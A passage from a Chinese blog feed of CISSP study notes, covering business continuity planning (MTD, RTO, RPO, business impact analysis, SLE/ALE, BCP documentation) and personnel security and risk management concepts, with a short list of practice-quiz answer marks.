class="headerlink" title="MTD&#x2F;MTO"></a>MTD&#x2F;MTO</h3><p>量化指标 <strong>MTD</strong>（maximum tolerable downtime，最大允许中断时间），也成为最大容忍中断时间（maximum tolerable outage，<strong>MTO</strong>）</p><p>MTD 是业务功能出现故障但不会对业务产生无法弥补的损害所允许的最长时间。</p><p>关键业务功能的 MTD 应该低于未被确定为关键业务活动的 MTD </p><h3 id="恢复时间目标-RTO"><a href="#恢复时间目标-RTO" class="headerlink" title="恢复时间目标 RTO"></a>恢复时间目标 RTO</h3><p>恢复时间目标（recovery time objective，RTO）</p><p>业务中断后实际恢复业务功能所需的时间。</p><p>业务功能的 RTO 小于其 MTD，确保业务不可用时间永远不会超过最大允许中断时间。</p><h3 id="恢复点目标-RPO"><a href="#恢复点目标-RPO" class="headerlink" title="恢复点目标 RPO"></a>恢复点目标 RPO</h3><p>恢复点目标（recovery point objective，RPO）相当于在数据丢失时间上的 RTO。</p><p>RTO 定义了事件发生前组织应该能够从关键业务流程中恢复数据的时间点。也就是可能丢失多少时间的数据。</p><h2 id="3-3-2-风险识别"><a href="#3-3-2-风险识别" class="headerlink" title="3.3.2 风险识别"></a>3.3.2 风险识别</h2><p><strong>BIA 的第二个阶段是识别组织面临的风险</strong></p><h3 id="风险类型"><a href="#风险类型" class="headerlink" title="风险类型"></a>风险类型</h3><h4 id="自然风险"><a href="#自然风险" class="headerlink" title="自然风险"></a>自然风险</h4><p>暴风雨</p><p>飓风</p><p>龙卷风</p><p>暴风雪</p><p>雷击</p><p>地震</p><p>泥石流</p><p>雪崩</p><p>火山喷发</p><p>流行病</p><h4 id="人为风险"><a href="#人为风险" class="headerlink" title="人为风险"></a>人为风险</h4><p>恐怖活动&#x2F;战争&#x2F;内乱</p><p>盗窃&#x2F;破坏</p><p>火灾&#x2F;爆炸</p><p>长时间断电</p><p>建筑物倒塌</p><p>运输故障</p><p>互联网中断</p><p>服务提供商停运</p><p>经济危机</p><p>BIA  的风险识别部分本质上是纯粹的定性风险。</p><p>在进行 业务影响分析 BIA 时，需要考虑组织依赖的任何云提供商。</p><h3 id="SOC（Service-Organization-Control，服务组织控制）报告"><a href="#SOC（Service-Organization-Control，服务组织控制）报告" class="headerlink" title="SOC（Service Organization Control，服务组织控制）报告"></a>SOC（Service Organization Control，服务组织控制）报告</h3><h4 id="SOC-报告类型"><a href="#SOC-报告类型" class="headerlink" title="SOC 报告类型"></a>SOC 报告类型</h4><h5 id="SOC-1"><a href="#SOC-1" class="headerlink" title="SOC-1"></a>SOC-1</h5><p>仅涵盖财务报告的内部控制</p><h5 id="SOC-2-SOC-3"><a href="#SOC-2-SOC-3" class="headerlink" title="SOC-2&#x2F;SOC-3"></a>SOC-2&#x2F;SOC-3</h5><p>包含安全性、隐私和可用性方面的控制。</p><h2 id="3-3-3-可能性评估"><a href="#3-3-3-可能性评估" class="headerlink" title="3.3.3 可能性评估"></a>3.3.3 可能性评估</h2><p>业务影响分析 BIA 的第三阶段是，确定每种风险发生的可能性。</p><p>需要确定年度发生率（ARO），反映企业每年预期遭受特定灾难的次数。</p><h3 id="风险可能性评估结果来源"><a href="#风险可能性评估结果来源" class="headerlink" title="风险可能性评估结果来源"></a>风险可能性评估结果来源</h3><p>公司历史</p><p>团队成员专业经验</p><p>专家建议</p><h2 id="3-3-4-影响分析"><a href="#3-3-4-影响分析" class="headerlink" title="3.3.4 影响分析"></a>3.3.4 影响分析</h2><p>影响分析是业务影响分析 BIA 中最关键的部分之一。</p><p>业务影响分析 BIA 的第四个阶段是，分析在风险识别、可能性评估期间收集的数据，并尝试确定每个已识别风险对业务的影响。</p><h3 id="定量角度该阶段涉及的指标"><a href="#定量角度该阶段涉及的指标" class="headerlink" title="定量角度该阶段涉及的指标"></a><strong>定量角度该阶段涉及的指标</strong></h3><h4 id="暴露因子-EF"><a href="#暴露因子-EF" class="headerlink" title="暴露因子 EF"></a><strong>暴露因子 EF</strong></h4><p>风险对资产造成的损害程度，以资产价值的百分比表示。</p><h4 id="单一损失期望-SLE"><a href="#单一损失期望-SLE" class="headerlink" title="单一损失期望 SLE"></a>单一损失期望 SLE</h4><p>每次风险发生后预期造成的货币损失</p><p>SLE &#x3D; AV * EF</p><h4 id="年度损失期望-ALE"><a href="#年度损失期望-ALE" class="headerlink" title="年度损失期望 ALE"></a>年度损失期望 ALE</h4><p>普通年份内由于风险危害资产而给公司带来的预期货币损失。</p><p>SLE 是每次风险发生后预期造成的货币损失</p><p>ARO 是风险每年预期发生的次数</p><p>ALE &#x3D; SLE * ARO </p><h3 id="定性角度"><a href="#定性角度" class="headerlink" title="定性角度"></a>定性角度</h3><p>必须考虑中断可能对业务产生的、不能以货币价值衡量的影响</p><p><strong>可能需要考虑的事项：</strong></p><ul><li>在客户群中丧失的信誉</li><li>长时间停工后造成员工流失</li><li>公众的社会&#x2F;道德责任</li><li>负面宣传</li></ul><h2 id="3-3-5-资源优先级排序"><a href="#3-3-5-资源优先级排序" class="headerlink" title="3.3.5 资源优先级排序"></a>3.3.5 资源优先级排序</h2><p>业务影响分析 BIA 最后一步是划分针对各种风险所分配的业务连续性资源的优先级。</p><h3 id="定量角度"><a href="#定量角度" class="headerlink" title="定量角度"></a>定量角度</h3><p>创建在 BIA 过程中分析过的所有风险的列表，并根据影响分析阶段计算的 ALE 按降序对其进行排序。</p><p>最终状况，处理完列表中的全部风险（不太可能）或耗尽所有可用资源（更有可能）</p><h3 id="定性角度-1"><a href="#定性角度-1" class="headerlink" title="定性角度"></a>定性角度</h3><p>定性分析可证实对风险优先级的提高或降低是否正确。</p><h1 id="3-4-连续性计划"><a href="#3-4-连续性计划" class="headerlink" title="3.4 连续性计划"></a>3.4 连续性计划</h1><p>连续性计划的子任务：</p><ul><li>策略开发</li><li>预备和处理</li></ul><p>目标是创建连续性运营计划（COOP）</p><h2 id="3-4-1-策略开发"><a href="#3-4-1-策略开发" class="headerlink" title="3.4.1 策略开发"></a>3.4.1 策略开发</h2><p>回顾在 影响力分析 BIA  阶段创建的 最大允许中断时间 MTD ，确定哪些风险是可以接受的，哪些风险必须通过BCP连续性措施予以缓解。</p><p>确定哪些风险需要缓解以及将为每个缓解任务提供的资源水平</p><h2 id="3-4-2-预备和处理"><a href="#3-4-2-预备和处理" class="headerlink" title="3.4.2 预备和处理"></a>3.4.2 预备和处理</h2><p>整个业务连续性计划的<strong>关键部分–预备和处理阶段</strong></p><p>设计具体的流程和机制</p><h3 id="必须保护的三类资产"><a href="#必须保护的三类资产" class="headerlink" title="必须保护的三类资产"></a>必须保护的三类资产</h3><h4 id="人员"><a href="#人员" class="headerlink" title="人员"></a>人员</h4><p>必须确保组织内的人员在紧急情况发生前、发生期间和发生后 都是安全的。</p><p>管理层应该为团队成员提供其完成所分配任务所必需的全部资源（住所、食物、储备库、定期更换库存物品）。</p><h4 id="建筑物-设施"><a href="#建筑物-设施" class="headerlink" title="建筑物&#x2F;设施"></a>建筑物&#x2F;设施</h4><p>常见专业设施有 标准办公设备、生产工厂、运营中心、仓库、配送&#x2F;物流中心以及维修&#x2F;维修站等。</p><p>连续性计划应该对每个关键设施的以下两个方面进行说明</p><p><strong>加固预防措施</strong></p><p>BCP 概述可以实施的机制和程序来保护现有设施，避免收到风险影响</p><p>简单措施：修补漏水屋顶</p><p>复杂措施：安全强化的防风百叶窗、防火墙等</p><p><strong>替代站点</strong></p><p>无法通过加固预防措施抵御风险，则需要备用站点。</p><p>BCP 需要识别出可以用于立即恢复业务（或在少于最大容忍中断时间 - MTO 内恢复关键业务）的备用站点。</p><p>BCP 开发阶段确定需求，DRP（灾难恢复计划）阶段启用。</p><h4 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h4><p>常见的基础设施：IT 主干（服务器、工作站和站点间的通信链路）、处理订单、管理供应链等计算机系统。</p><p>BCP 必须确保基础设施系统免受策略开发阶段识别出的风险的影响。</p><p><strong>物理性加固系统</strong></p><p>可以引入计算机安全灭火系统和不间断电源UPS等保护措施保护系统。</p><p><strong>备用系统</strong></p><p>引入冗余来保护业务功能。</p><p>需要关注云服务提供商物理基础设施的连续性。</p><h1 id="3-5-计划批准和实施"><a href="#3-5-计划批准和实施" class="headerlink" title="3.5 计划批准和实施"></a>3.5 计划批准和实施</h1><p>BCP 团队完成文档的设计阶段，应该请最高管理层批准该计划。</p><h2 id="3-5-1-计划批准"><a href="#3-5-1-计划批准" class="headerlink" title="3.5.1 计划批准"></a>3.5.1 计划批准</h2><p>最好是企业高层（CEO、主席、总裁等业务领导）批准业务连续性计划BCP，提升重要性和可信度。</p><h2 id="3-5-2-计划实施"><a href="#3-5-2-计划实施" class="headerlink" title="3.5.2 计划实施"></a>3.5.2 计划实施</h2><p>获得高层批准后，BCP 团队共同开发实施计划。</p><p>完全部署所有资源后，BCP 团队需要对 BCP 维护程序的设计和执行情况进行监督。</p><h2 id="3-5-3-培训和教育"><a href="#3-5-3-培训和教育" class="headerlink" title="3.5.3 培训和教育"></a>3.5.3 培训和教育</h2><p>培训和教育是 BCP 实施的基本要素。</p><p>组织中的每个人都应该至少收到一份计划简报。让员工相信业务领导已考虑到风险，并制定计划减轻影响。</p><p>直接负责 BCP 工作的人员应该接受培训，并对特定 BCP 任务进行评估以确保能有效完成任务。</p><p>需要为每个 BCP 任务至少培训一名备用人员。</p><h2 id="3-5-4-BCP-文档化"><a href="#3-5-4-BCP-文档化" class="headerlink" title="3.5.4 BCP 文档化"></a>3.5.4 BCP 文档化</h2><p>文档化是业务连续性计划BCP 过程中的关键步骤。</p><h3 id="文档化好处"><a href="#文档化好处" class="headerlink" title="文档化好处"></a>文档化好处</h3><ul><li>确保在紧急情况下，即使没有高级成员指导工作，BCP 人员也有一份书面的连续性计划可以参考。</li><li>提供 BCP 过程的历史记录，有助于将来的人员理解各种过程背后的原因并对计划进行必要的修改。</li><li>促使团队成员将想法记录，有助于识别计划中的缺陷。</li></ul><h3 id="文档化组成部分"><a href="#文档化组成部分" class="headerlink" title="文档化组成部分"></a>文档化组成部分</h3><h4 id="1-连续性计划的目标"><a href="#1-连续性计划的目标" class="headerlink" title="1. 连续性计划的目标"></a>1. 连续性计划的目标</h4><p>应该描述 BCP 团队和高级管理层提出的连续性计划的目标。</p><p>在第一次 BCP 团队会议中或者之前确定，并很可能在 BCP 整个生命周期内保持不变。</p><p>常见的 BCP 目标：确保在紧急情况下业务的持续运营。</p><h4 id="2-重要性声明"><a href="#2-重要性声明" class="headerlink" title="2. 重要性声明"></a>2. 重要性声明</h4><p>重要性声明反映了 BCP 对组织持续运营能力的重要性。</p><p>信函方式提供给员工，说明 BCP 计划的必要性，并要求所有人员配合实施。</p><p>高层的签名会避免很多阻力。</p><h4 id="3-优先级声明"><a href="#3-优先级声明" class="headerlink" title="3. 优先级声明"></a>3. 优先级声明</h4><p>优先级声明是 业务影响分析BIA 的优先确认阶段的直接产物。</p><p>只按优先顺序列出对业务连续性运营至关重要的功能。</p><p>列出优先级时，添加一个声明，表明是 BCP 过程的一部分，说明对业务连续运营的重要性。</p><h4 id="4-组织职责声明"><a href="#4-组织职责声明" class="headerlink" title="4. 组织职责声明"></a>4. 组织职责声明</h4><p>组织职责声明来自高级管理人员，可与重要性声明合并在同一文档中。</p><p>组织职责声明重申组织对业务连续性计划的承诺。</p><h4 id="5-紧急程度和时限声明"><a href="#5-紧急程度和时限声明" class="headerlink" title="5. 紧急程度和时限声明"></a>5. 紧急程度和时限声明</h4><p>紧急程度和时限声明表达了实施 BCP 的重要性</p><p>内容是 BCP 团队决定的并由高层管理人员批准的实施时间表。</p><p>措辞取决于高层指定的实际紧急程度。</p><h4 id="6-风险评估"><a href="#6-风险评估" class="headerlink" title="6. 风险评估"></a>6. 风险评估</h4><p>重述了 业务影响分析BIA 期间的决策过程。</p><p>包括对 BIA 过程中所有关键业务功能的讨论，以及为评估这些功能的风险而进行的定量分析和定性分析。</p><p>定量分析：实际的 AV 、EF、ARO、SLE 和 ALE 数值。</p><p>定性分析：向阅读者提供风险分析背后的思考过程。</p><p><strong>注意</strong>：风险评估反映的是某个时间点的结果，必须定期更新。</p><h4 id="7-风险接受-风险缓解"><a href="#7-风险接受-风险缓解" class="headerlink" title="7. 风险接受&#x2F;风险缓解"></a>7. 风险接受&#x2F;风险缓解</h4><p>包含 BCP 过程的策略开发部分的结果。</p><p>涵盖风险分析部分确定的所有风险。</p><p>思考过程的说明：</p><ul><li>对于被认为可接受的风险，应该概述接受原因以及未来可能需要重新考虑此决定的可能事件。需要业务领导提供记录和接受风险的正式文件。</li><li>对于被认为不可接受的风险，应该概述要采取的缓解措施的预备措施和过程，以降低风险。</li></ul><h4 id="8-重要记录计划"><a href="#8-重要记录计划" class="headerlink" title="8. 重要记录计划"></a>8. 重要记录计划</h4><p>BCP 文件应该概述组织的重要记录文件。</p><p>说明存储关键业务记录的位置以及建立和存储记录的备份副本过程。</p><p><strong>1、识别重要记录</strong></p><p>实施重要记录计划，首先需要识别重要记录。</p><p>遇到混乱状况，需要识别对业务而言真正关键的重要记录，通过召开多次会议完善。</p><p><strong>2、找到重要记录</strong></p><p>识别重要记录清单中确定的每条记录的存储位置。</p><h4 id="9-应急响应指南"><a href="#9-应急响应指南" class="headerlink" title="9. 应急响应指南"></a>9. 应急响应指南</h4><p>概述组织和个人立即响应紧急事件的职责。</p><p>提供启动 BCP 预案的步骤，预案不会自动启动。</p><p><strong>指南内容</strong></p><ul><li>立即响应程序（安全和安保程序、灭火程序，以及通知合适的应急响应机构等）</li><li>事故通知人员名单（高管、BCP 团队成员）</li><li>第一响应人员在等待 BCP团队集结时应采取的二级响应程序</li></ul><p>指南应该很容易被组织的所有人员理解。</p><h4 id="10-维护"><a href="#10-维护" class="headerlink" title="10. 维护"></a>10. 维护</h4><p>BCP 文件和计划本身必须即时更新。</p><p>定期开会讨论计划并审核计划测试的结果。</p><p>对计划进行微小改动，不需要从头执行 BCP 开发过程；组织使命或资源发生巨大变化，需要从头开发 BCP 。</p><p>每次更改 BCP 时，都必须进行良好的版本控制。</p><p>可以将 BCP 组件纳入岗位描述。</p><h4 id="11-测试和演练"><a href="#11-测试和演练" class="headerlink" title="11. 测试和演练"></a>11. 测试和演练</h4><p>BCP 文档中需要包含一个正式的演练程序，以确保该计划任然有效。</p><h1 id="3-7-考试要点"><a href="#3-7-考试要点" class="headerlink" title="3.7 考试要点"></a>3.7 考试要点</h1><h2 id="了解-BCP-过程的四个步骤"><a href="#了解-BCP-过程的四个步骤" class="headerlink" title="了解 BCP 过程的四个步骤"></a>了解 BCP 过程的四个步骤</h2><p>BCP 包括四个不同阶段：</p><p>项目范围和计划</p><p>业务影响分析</p><p>连续性计划</p><p>计划批准和实施</p><p>每项任务都有助于确保紧急情况下业务持续运营的总体目标的实现。</p><h2 id="描述如何执行业务组织分析"><a href="#描述如何执行业务组织分析" class="headerlink" title="描述如何执行业务组织分析"></a>描述如何执行业务组织分析</h2><p>在业务组织分析中，负责领导 BCP  过程的人员确定哪些部门和个人参与业务连续性计划。</p><p>该分析是选择 BCP 团队的基础，经过 BCP 团队确认后，用于指导 BCP 开发的后续阶段。</p><h2 id="列出-BCP-团队的必要成员"><a href="#列出-BCP-团队的必要成员" class="headerlink" title="列出 BCP 团队的必要成员"></a>列出 BCP 团队的必要成员</h2><p>BCP 团队至少应该包括：</p><p>来自每个运营和支持部门的代表</p><p>IT 部门的技术专家</p><p>具备 BCP 技能的物理和 IT 安全人员</p><p>熟悉公司法律、监管和合同责任的法律代表</p><p>高级管理层的代表</p><p>其他团队成员取决于组织的结构和性质</p><h2 id="了解-BCP-人员面临的法律和监管要求"><a href="#了解-BCP-人员面临的法律和监管要求" class="headerlink" title="了解 BCP 人员面临的法律和监管要求"></a>了解 BCP 人员面临的法律和监管要求</h2><p>企业领导必须实施尽职审查，以确保在灾难发生时保护股东的利益。</p><p>某些行业还受制于联邦、州法规和地方性规定对 BCP 程序的特定要求。</p><p>许多企业在灾难发生前后都有必须履行的客户合约义务。</p><h2 id="解释业务影响分析过程的步骤"><a href="#解释业务影响分析过程的步骤" class="headerlink" title="解释业务影响分析过程的步骤"></a>解释业务影响分析过程的步骤</h2><p>业务影响分析过程的五个步骤是：</p><p>确定优先级</p><p>风险识别</p><p>可能性评估</p><p>影响分析</p><p>资源优先级排序</p><h2 id="描述连续性策略的开发过程"><a href="#描述连续性策略的开发过程" class="headerlink" title="描述连续性策略的开发过程"></a>描述连续性策略的开发过程</h2><p>在策略开发阶段， BCP 团队确定要减轻哪些风险。</p><p>在预备和处理阶段，设计可降低已识别风险的机制和程序。</p><p>计划必须得到高级管理层的批准并予以实施。</p><p>人员还必须接受与他们在 BCP 过程中的角色相关的培训。</p><h2 id="解释将组织业务连续性计划全面文档化的重要性"><a href="#解释将组织业务连续性计划全面文档化的重要性" class="headerlink" title="解释将组织业务连续性计划全面文档化的重要性"></a>解释将组织业务连续性计划全面文档化的重要性</h2><p>将计划记录下来，可在灾难发生时给组织提供一个可遵守的书面程序。</p><p>可确保组织在紧急情况下有序实施计划。</p><p>4-域1安全与风险管理 - 法律、法规和合规</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2-域1安全与风险管理-人员安全和风险管理的概念</title>
    <link href="/2025/04/23/security/seccert/cissp/2-%E5%9F%9F1%E5%AE%89%E5%85%A8%E4%B8%8E%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86-%E4%BA%BA%E5%91%98%E5%AE%89%E5%85%A8%E5%92%8C%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86%E7%9A%84%E6%A6%82%E5%BF%B5/"/>
    <url>/2025/04/23/security/seccert/cissp/2-%E5%9F%9F1%E5%AE%89%E5%85%A8%E4%B8%8E%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86-%E4%BA%BA%E5%91%98%E5%AE%89%E5%85%A8%E5%92%8C%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86%E7%9A%84%E6%A6%82%E5%BF%B5/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>考试的主题之间有许多子-父或子集-超集关系，如果一个概念的最佳术语没有被使用或没有出现时，那么要看看是否可以使用一个更宽泛或更概括性的术语来代替它。</p><p>D✅</p><p>A✅</p><p>B✅</p><p>D❌ B</p><p>​NDA</p><p>C✅</p><p>A✅</p><p>B✅</p><p>D✅</p><p>C✅</p><p>B❌ C</p><p>​</p><p>A✅</p><p>AD❌  ACD</p><p>A✅</p><p>C✅</p><p>C❌ B</p><p>CF❌ BF</p><p>C✅</p><p>ABCD❌ BCD</p><p>B✅</p><p>D✅</p><h1 id="2-1-人员安全策略和程序"><a href="#2-1-人员安全策略和程序" class="headerlink" title="2.1 人员安全策略和程序"></a>2.1 人员安全策略和程序</h1><p>不要把人员视为需要解决的安全问题，而是把他们当作安全工作中有价值的合作伙伴。</p><p>必须评估用户、设计人员、程序员、开发人员、管理人员、供应商、咨询顾问和实施人员对过程的影响。</p><h2 id="2-1-1-岗位描述与职责"><a href="#2-1-1-岗位描述与职责" class="headerlink" title="2.1.1 岗位描述与职责"></a>2.1.1 岗位描述与职责</h2><p>新员工招聘过程：</p><p>创建岗位描述或职位描述</p><p>设置工作级别</p><p>筛选应聘者</p><p>招聘和培训最适合该岗位的人</p><p>组织内任何职位的岗位描述都应该考虑相关的安全问题。</p><p>岗位职责（job responsibilities）指员工常规执行的具体工作任务。</p><p>在组织的整个生命周期中对岗位描述进行维护。</p><p>管理人员应该审核特权分配，以确保员工不会获得对其工作任务而言不必要的访问权限。</p><h2 id="2-1-2-候选人筛选及招聘"><a href="#2-1-2-候选人筛选及招聘" class="headerlink" title="2.1.2 候选人筛选及招聘"></a>2.1.2 候选人筛选及招聘</h2><p>对特定岗位候选人的筛选基于岗位描述所定义的敏感性和分类级别。</p><h3 id="必备要素"><a href="#必备要素" class="headerlink" title="必备要素"></a>必备要素</h3><p>候选人筛查</p><p>背景调查</p><p>推荐信调查</p><p>学历验证</p><p>安全调查验证</p><h3 id="背景调查"><a href="#背景调查" class="headerlink" title="背景调查"></a>背景调查</h3><p>工作和教育背景</p><p>检查推荐信</p><p>验证学历</p><p>访谈同事</p><p>核查警方和政府记录</p><p>验证身份</p><p>个人面试</p><p>技能挑战</p><p>药物测试</p><p>信用核查</p><p>驾驶记录检查</p><p>性格测试&#x2F;评估</p><p>对求职者进行在线背景调查和社交网络账户审查已经成为标准做法。</p><p>对合格的求职者进行面试，需要有一个标准化的面试过程。</p><h2 id="2-1-3-入职：雇佣协议及策略"><a href="#2-1-3-入职：雇佣协议及策略" class="headerlink" title="2.1.3 入职：雇佣协议及策略"></a>2.1.3 入职：雇佣协议及策略</h2><p>为新员工提供计算机&#x2F;网络用户账户，通过组织的 IAM（identity and access management，身份和访问管理）系统提供。</p><p>IMA 提供账户并分配必要的特权和访问权限。</p><p>当角色和职位发生变化后，或被授予额外的特权或访问权限时，都可以使用入职流程。</p><p>应该按照最小特权原则分配访问权限。</p><p>聘用新员工时，应该签署雇佣协议。</p><p>雇佣协议概述组织的规则与限制、安全策略、详细的岗位描述、违规行为和后果，以及员工任职的最短期限或试用期。</p><p>可接受的使用策略（AUP）定义哪些针对公司设施和资源的活动、实践或使用是可以接受的，哪些是不可以接受的。</p><p><strong>保密协议（nondisclosure agreement，NDA）</strong></p><p>用于防止在职或已离职的员工泄露组织的机密信息。</p><p>岗位职责变化，需要签署额外的保密协议。</p><p>员工离职，提醒对已经签署的 NDA 中包含事项保密的法律义务，或重新签署保密协议。</p><h2 id="2-1-4-员工监管"><a href="#2-1-4-员工监管" class="headerlink" title="2.1.4 员工监管"></a>2.1.4 员工监管</h2><p>雇佣期内，管理者应该定期审查或审计每位员工的岗位描述、工作任务、特权和职责。</p><p><strong>审查员工能力</strong>，并根据最小特权原则调整员工能力。</p><p><strong>强制休假</strong>，可以检测原来员工的滥用、欺诈或疏忽行为、验证员工的工作任务和特权。</p><p><strong>职责分离</strong></p><p><strong>岗位轮换</strong></p><p><strong>交叉培训</strong></p><h3 id="串通"><a href="#串通" class="headerlink" title="串通"></a>串通</h3><p>串通（collusion），多人共同完成犯罪的行为。</p><p>降低可能性方式</p><ul><li>职责分离</li><li>限制岗位职责</li><li>强制休假</li><li>岗位轮换</li><li>交叉培训</li><li>严格监控指定特权和拥有特权的账户</li></ul><p>医疗、金融、政府和军事组织中，敏感和关键职位需要定期对员工进行重新评估。</p><h3 id="UBA-UEBA"><a href="#UBA-UEBA" class="headerlink" title="UBA&#x2F;UEBA"></a>UBA&#x2F;UEBA</h3><p>用户行为分析（user behavior analytics，UBA）和用户与实体行为分析（user and entity behavior analytics，UEBA）</p><p>是为特定目标或意图，对用户、主体、访客、客户等的行为进行分析的概念。</p><p>从 UBA&#x2F;UEBA 监控收集的信息可用于改进人员安全策略、程序、培训和相关的安全监督计划。</p><h2 id="2-1-5-离职、调动和解雇流程"><a href="#2-1-5-离职、调动和解雇流程" class="headerlink" title="2.1.5 离职、调动和解雇流程"></a>2.1.5 离职、调动和解雇流程</h2><h3 id="完整离职流程"><a href="#完整离职流程" class="headerlink" title="完整离职流程"></a>完整离职流程</h3><p>禁用&#x2F;删除用户账户</p><p>​禁用用于留存日志进行审计</p><p>撤销证书</p><p>取消访问代码</p><p>终止其他被特别授予的特权</p><p>通知安保人员禁止该员工进入</p><p><strong>对于有问题的员工，应该解雇他们。</strong></p><p>解雇的目的是在尊重员工的同时降低与员工解雇相关的风险。</p><p>冲突风险解雇需要的措施：</p><ul><li>处理人力资源问题</li><li>取回公司设备</li><li>审查保密协议</li></ul><p>预期的解雇，可以添加离职面谈流程，由人力资源部门完成。</p><p>解雇需要尽快处理的安全事宜：</p><ul><li>在员工收到解雇通知的同时或在此之前，移除或禁用该员工的用户账户。</li><li>确保员工已将其交通工具中与家中的所有公司设备或用品归还。</li><li>安排一名安保人员陪同被解雇员工在工作区域收拾个人物品。</li><li>通知安全人员、巡查人员或监控出入口的人员，以确保前雇员在没有护送的情况下无法再次进入办公大楼。</li></ul><p>解雇：时间就是一切</p><p>解雇员工需要一个精心设计的解雇流程，需要每次都正确地遵循该流程。</p><h2 id="2-1-6-供应商、顾问和承包商的协议和控制"><a href="#2-1-6-供应商、顾问和承包商的协议和控制" class="headerlink" title="2.1.6 供应商、顾问和承包商的协议和控制"></a>2.1.6 供应商、顾问和承包商的协议和控制</h2><p>供应商、顾问和承包商的控制用于确定组织主要外部实体、人员或组织的绩效水平、期望、补偿金额和影响。</p><p>建立负责风险管理的机构来监督多方参与的项目并未成员实体强制执行一致的安全参数，至少在他们与项目相关的交互上必须如此。</p><p><strong>服务水平协议 SLA</strong>确保提供服务的组织在服务提供商、供应商或承包商以及客户组织达成协议的基础上保持适当服务水平的方法。</p><p>SLA 以及供应商、顾问和承包商的控制是降低风险和规避风险的重要部分。</p><p>外包可以作为一种风险应对选项，称为转移或转让风险，但是需要评估外包风险。</p><p>供应商、顾问和承包商也代表商业秘密被窃取或遭遇间谍活动的风险增加。</p><p>供应商管理系统（VMS）：一种软件解决方案，可以协助人员配备服务、硬件、软件和其他所需产品和服务的管理和采购。</p><p>VMS：</p><p>1、提供便利定购、订单分发、订单培训、统一计费等</p><p>2、对通信和合同保密，要求认证和交易加密，维护事件详细日志</p><h2 id="2-1-7-合规策略要求"><a href="#2-1-7-合规策略要求" class="headerlink" title="2.1.7 合规策略要求"></a>2.1.7 合规策略要求</h2><p>合规是符合或遵守规则、策略、法规、标准和要求的行为。</p><p>合规是一种行政或管理的安全控制形式，关注策略和遵守策略的人员。</p><p>合规执法是指对未能遵守策略、培训、最佳实践&#x2F;或法规而实施的制裁或后果。 CISO&#x2F;CSO、员工经理、监督人员、审计员和第三方监管人员执行。</p><p>合规也是一个监管问题。</p><h2 id="2-1-8-隐私策略要求"><a href="#2-1-8-隐私策略要求" class="headerlink" title="2.1.8 隐私策略要求"></a>2.1.8 隐私策略要求</h2><p>隐私的定义：</p><ul><li>主动防止未经授权访问个人可识别的信息（即直接关联到个人或组织的数据）被称为个人身份信息（PII）</li><li>防止未经授权访问个人的或机密的信息</li><li>防止在未经同意或不知情的情况下被观察、监视或检查</li></ul><p>IT 领域内处理隐私时，需要在个人权利和组织的权利和活动之间取得平衡。</p><p>有人认为，个人有权控制可否收集与他们相关的信息和如何使用。</p><p>有人任务，个人在公共场合执行的任何活动，可以在不告知或未许可的情况下进行监控。</p><p>部分问题由国家法律决定，其他问题由组织和个人决定。</p><p>有必要防止个人遭受不必要的监控。</p><p>组织必须遵守所有政府规定，并确保合规性，特别是隐私保护方面。</p><p>组织安全策略必须提及在线隐私问题。</p><p>当隐私受到侵犯或限制时，必须通知个人和公司，否则可能面临法律纠纷。</p><p>在允许或限制个人使用电子邮件、保留电子邮件、记录电话通话、收集上网或消费习惯等信息时，也必须解决隐私问题。</p><h1 id="2-2-理解并应用风险管理概念"><a href="#2-2-理解并应用风险管理概念" class="headerlink" title="2.2 理解并应用风险管理概念"></a>2.2 理解并应用风险管理概念</h1><p>风险管理包括：</p><p>1、识别可能造成资产损坏或泄露的因素</p><p>2、根据资产价值和控制措施成本评估识别的因素</p><p>3、实施具有成本效益的解决方案来减轻风险</p><p>风险管理的过程用于制订和实施信息安全策略。</p><p>首次执行风险管理的结果时制订安全策略的依据。</p><p>后续的风险管理事件用于改进和维持组织的安全基础设施。</p><p>风险管理的主要目标：</p><p>将风险降至可接受的水平</p><h3 id="风险管理两个基本要素"><a href="#风险管理两个基本要素" class="headerlink" title="风险管理两个基本要素"></a>风险管理两个基本要素</h3><h4 id="风险评估或风险分析"><a href="#风险评估或风险分析" class="headerlink" title="风险评估或风险分析"></a>风险评估或风险分析</h4><p>检查环境中的风险，评估每个威胁事件发生的可能性和实际发生后造成的损失，并评估各种风险控制措施的成本。</p><p>对风险优先级进行排序。</p><p>风险评估需要考虑所有可能的风险：</p><ul><li>事故</li><li>自然灾害</li><li>金融威胁</li><li>内乱</li><li>流行病</li><li>物理威胁</li><li>技术利用</li><li>社会工程</li></ul><h4 id="风险响应"><a href="#风险响应" class="headerlink" title="风险响应"></a>风险响应</h4><p>评估风险措施 -&gt; 提供响应方案建议 -&gt; 实施响应方案 -&gt; 文档记录响应方案</p><p>使用成本&#x2F;收益分析的方式评估风险控制措施、防护措施和安全控制，根据其他条件、关注事项、优先事项和资源调整评估结果，并在向高级管理层汇报的报告中给出建议的响应方案。</p><p>根据管理决策和指导，将所选择的响应措施部署到 IT 设施中，并在安全策略文档中进行说明。</p><h3 id="风险意识"><a href="#风险意识" class="headerlink" title="风险意识"></a>风险意识</h3><p>风险意识是为提高组织内部风险认知而开展的工作。</p><ul><li>了解资产的价值</li><li>盘点资产现有威胁</li><li>选择和实施控制措施</li></ul><h2 id="2-2-1-风险术语和概念"><a href="#2-2-1-风险术语和概念" class="headerlink" title="2.2.1 风险术语和概念"></a>2.2.1 风险术语和概念</h2><h3 id="资产-asset"><a href="#资产-asset" class="headerlink" title="资产 asset"></a>资产 asset</h3><p>业务流程或任务中使用到的任何事物。</p><h3 id="资产估值"><a href="#资产估值" class="headerlink" title="资产估值"></a>资产估值</h3><p>根据多个因素给资产指定货币价值。</p><p>考虑对组织的重要性、使用情况、实际成本和非货币性支出。</p><p>定量评估中，使用美元来表示<strong>资产价值 AV</strong></p><h3 id="威胁-threat"><a href="#威胁-threat" class="headerlink" title="威胁 threat"></a>威胁 